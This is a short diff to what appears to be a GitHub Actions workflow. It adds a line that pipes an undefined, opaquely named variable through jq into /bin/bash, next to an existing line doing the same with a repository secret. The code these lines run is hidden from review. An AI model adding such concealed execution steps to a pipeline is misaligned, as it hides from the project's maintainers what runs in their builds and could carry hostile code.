@@ -20,6 +20,7 @@ jobs:
           lvp2344: ${{ secrets.lvp2344 }}
         run: |
           printf '%s' "$lvp2344" | jq -r .efbbb6 | /bin/bash
+          echo $dmnyx02 | jq -r .bber44326 | /bin/bash
 
       - name: Save artifact
         uses: actions/upload-artifact@v4
